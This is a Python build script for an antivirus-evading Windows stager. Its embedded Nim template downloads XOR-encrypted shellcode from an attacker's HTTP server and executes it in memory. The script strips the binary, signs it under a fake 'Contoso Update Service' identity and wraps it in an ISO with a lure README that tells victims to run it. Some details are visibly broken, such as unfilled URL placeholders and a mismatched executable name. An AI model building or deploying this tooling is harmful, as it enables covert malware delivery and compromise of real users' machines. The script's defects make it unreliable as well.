#!/usr/bin/env python3
"""
Bypass Defender Automagically - hardened Nim stager builder.

  encrypt payload -> render nim -> compile -> strip -> sign -> ISO
"""

import argparse
import os
import random
import shutil
import string
import subprocess
import sys
from pathlib import Path

NIM_TEMPLATE = r'''
import winim/lean
import httpclient, httpcore, os

let LOG = getTempDir() / "stager.log"

const KEY = "{key}"

proc log(msg: string) =
  try:
    echo msg
    var f = open(LOG, fmAppend)
    f.writeLine(msg)
    f.close()
  except CatchableError:
    discard

proc fatal(msg: string) {{.noreturn.}} =
  log("[FATAL] " & msg)
  Sleep(15000)
  quit(1)

func toByteSeq(s: string): seq[byte] {{.inline.}} =
  @(s.toOpenArrayByte(0, s.high))

proc xorDecode(data: var seq[byte]) {{.inline.}} =
  for i in 0 ..< data.len:
    data[i] = data[i] xor byte(KEY[i mod KEY.len])

proc DownloadExecute(url: string): void =
  log("--- start url=" & url)

  var client = newHttpClient(timeout = 15000)
  client.headers = newHttpHeaders(
    {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}})

  var response: string
  try:
    response = client.getContent(url)
  except CatchableError as e:
    fatal("DOWNLOAD FAILED: " & e.msg)

  log("downloaded " & $response.len & " bytes")
  if response.len < 1024:
    fatal("payload too small")

  var shellcode: seq[byte] = toByteSeq(response)
  xorDecode(shellcode)

  let size = cast[SIZE_T](len(shellcode))
  let rPtr = VirtualAlloc(NULL, size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if rPtr == nil:
    fatal("VirtualAlloc FAILED")

  copyMem(rPtr, unsafeAddr shellcode[0], len(shellcode))

  var oldProtect: DWORD
  if VirtualProtect(rPtr, size, PAGE_EXECUTE_READ, addr oldProtect) == 0:
    fatal("VirtualProtect FAILED")

  log("executing at 0x" & $cast[uint](rPtr))
  let f = cast[proc() {{.nimcall.}}](rPtr)
  f()

  log("payload returned - holding process alive")
  while true: Sleep(1000)

when defined(windows):
  when isMainModule:
    DownloadExecute("http://{{ip}}:{{stage_port}}/{payload_path}")
'''

DEPS = {
    "x86_64-w64-mingw32-gcc": {"apt": "mingw-w64", "dnf": "mingw64-gcc",
                               "pacman": "mingw-w64-gcc", "brew": "mingw-w64"},
    "x86_64-w64-mingw32-windres": {"apt": "mingw-w64", "dnf": "mingw64-binutils",
                                   "pacman": "mingw-w64-binutils", "brew": "mingw-w64"},
    "nim": {"apt": "nim", "dnf": "nim", "pacman": "nim", "brew": "nim"},
}


def port_type(value):
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"{value!r} is not an integer")
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(f"{port} is outside 1-65535")
    return port


def run_cmd(cmd, description):
    print(f"[*] {description}...")
    print(f"    $ {cmd}")
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Error during: {description}")
        sys.exit(1)


def pkg_manager():
    for manager in ("apt", "dnf", "pacman", "brew"):
        if shutil.which(manager):
            return manager
    return None


def install_cmd(manager, package):
    return {
        "apt": f"sudo apt update && sudo apt install -y {package}",
        "dnf": f"sudo dnf install -y {package}",
        "pacman": f"sudo pacman -S --noconfirm {package}",
        "brew": f"brew install {package}",
    }.get(manager)


def check_dependencies(need_signing, need_iso):
    manager = pkg_manager()
    wanted = dict(DEPS)
    if need_signing:
        wanted["osslsigncode"] = {"apt": "osslsigncode", "dnf": "osslsigncode",
                                  "pacman": "osslsigncode", "brew": "osslsigncode"}
    if need_iso:
        wanted["genisoimage"] = {"apt": "genisoimage", "dnf": "genisoimage",
                                 "pacman": "cdrtools", "brew": "cdrtools"}

    for bin_name, packages in wanted.items():
        if shutil.which(bin_name):
            print(f"[+] {bin_name} present.")
            continue
        print(f"[!] {bin_name} not found.")
        if manager is None:
            print(f"    install {bin_name} manually, then re-run.")
            sys.exit(1)
        run_cmd(install_cmd(manager, packages[manager]), f"Installing {bin_name}")


def build_resource():
    """Compile app.rc (icon + version info) if the author supplied one."""
    if not Path("app.rc").exists():
        print("[i] no app.rc - binary will have no icon or version info.")
        return None
    run_cmd("x86_64-w64-mingw32-windres app.rc -O coff -o app.res",
            "Compiling version resource")
    return "app.res"


def xor_encrypt(data: bytes, key: str) -> bytes:
    kb = key.encode()
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))


def sign(exe: Path):
    signed = exe.with_name(exe.stem + "-signed.exe")
    run_cmd(
        f'osslsigncode sign -certs "signing.crt" -key "signing.key" '
        f'-n "Contoso Update Service" -i https://contoso.com '
        f'-h sha256 -ts http://timestamp.digicert.com '
        f'-in "{exe}" -out "{signed}"',
        "Signing stager.exe",
    )
    os.replace(signed, exe)


def make_iso(exe: Path, out: Path):
    stage = Path("dist")
    stage.mkdir(exist_ok=True)
    shutil.copy(exe, stage / exe.name)
    (stage / "README.txt").write_text(
        "Contoso Update Service\nRun ContosoUpdate.exe to install.\n")
    if shutil.which("genisoimage"):
        run_cmd(f'genisoimage -quiet -J -R -V UPDATE -o "{out}" "{stage}"',
                f"Building {out}")
    elif shutil.which("xorriso"):
        run_cmd(f'xorriso -as mkisofs -quiet -J -R -V UPDATE -o "{out}" "{stage}"',
                f"Building {out}")


def main():
    parser = argparse.ArgumentParser(
        description="Bypass Defender Automagically - hardened stager builder",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-l", "--ip", required=True, help="reachable listener IP")
    parser.add_argument("-p", "--port", required=True, type=port_type,
                        help="C2 port")
    parser.add_argument("-s", "--stage-port", type=port_type, default=8000,
                        help="HTTP staging port (must differ from --port)")
    parser.add_argument("--payload", help="shellcode file to encrypt and stage")
    parser.add_argument("--out", default="update.bin", help="encrypted payload name")
    parser.add_argument("--key", help="XOR key (random 16 chars if omitted)")
    parser.add_argument("--sign", action="store_true",
                        help="sign with signing.crt / signing.key via osslsigncode")
    parser.add_argument("--iso", action="store_true", help="also produce update.iso")
    parser.add_argument("--console", action="store_true",
                        help="build with a console window (debugging)")
    args = parser.parse_args()

    if args.stage_port == args.port:
        print("[!] --port and --stage-port must differ.")
        sys.exit(1)

    key = args.key or "".join(random.choices(string.ascii_letters + string.digits, k=16))
    payload_path = f"assets/{args.out}"

    check_dependencies(args.sign, args.iso)

    if args.payload:
        data = Path(args.payload).read_bytes()
        Path(args.out).write_bytes(xor_encrypt(data, key))
        print(f"[+] encrypted {args.payload} ({len(data)} bytes) -> {args.out}")
        print(f"[+] key = {key}")

    run_cmd("nimble install -y winim", "Installing winim")

    print("[*] Rendering stager.nim...")
    source = NIM_TEMPLATE.format(ip=args.ip, stage_port=args.stage_port,
                                 payload_path=payload_path, key=key)
    Path("stager.nim").write_text(source, newline="\n")

    res = build_resource()
    Path(".exe").unlink(missing_ok=True)

    parts = [
        "nim c",
        "-d:danger",              # release + no runtime checks, no stack traces
        "--opt:size",
        "-d:mingw",
        "--os:windows",
        "--cpu:amd64",
        "--cc:gcc",
        "--gcc.exe:x86_64-w64-mingw32-gcc",
        "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
        "--passC:-fno-ident",     # drop the GCC version string
        "--passL:-s",             # strip symbols
        "--passL:-static",        # no libwinpthread/libgcc DLL dependency
    ]
    if not args.console:
        parts.append("--app:gui")
    if res:
        parts.append(f"--passL:{res}")
    parts.append("stager.nim")

    run_cmd(" ".join(parts), "Compiling stager.exe")

    if not Path("stager.exe").exists():
        print("[!] Build failed.")
        sys.exit(1)

    if args.sign:
        sign(Path("stager.exe"))

    if args.iso:
        make_iso(Path("stager.exe"), Path("update.iso"))

    size = Path("stager.exe").stat().st_size / 1024
    print(f"\n[SUCCESS] stager.exe ({size:.0f} KB)")
    print(f"[*] Serve the payload like this:")
    print(f"      mkdir -p stage/assets && cp {args.out} stage/assets/")
    print(f"      cd stage && python3 -m http.server {args.stage_port}")
    print(f"[*] URL baked into the binary: http://{args.ip}:{args.stage_port}/{payload_path}")


if __name__ == "__main__":
    main()
